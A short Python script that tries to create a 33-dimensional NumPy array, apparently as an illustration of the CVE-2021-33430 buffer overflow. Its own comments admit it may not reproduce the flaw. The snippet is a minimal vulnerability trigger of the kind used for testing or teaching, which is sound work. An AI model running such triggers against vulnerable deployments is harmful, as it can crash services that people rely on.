import numpy as np

# Attempting to create an array with a very large number of dimensions.
# Note: This is an illustrative example and may not directly replicate the CVE-2021-33430 conditions.

try:
    # Specifying a large number of dimensions
    dimensions = tuple([2] * 33)  # More than 32 dimensions

    # Creating an array with the specified dimensions
    # This could potentially lead to a buffer overflow in vulnerable environments
    large_dim_array = np.zeros(dimensions)
    print("Array created successfully:", large_dim_array.shape)
except Exception as e:
    print("Error occurred:", e)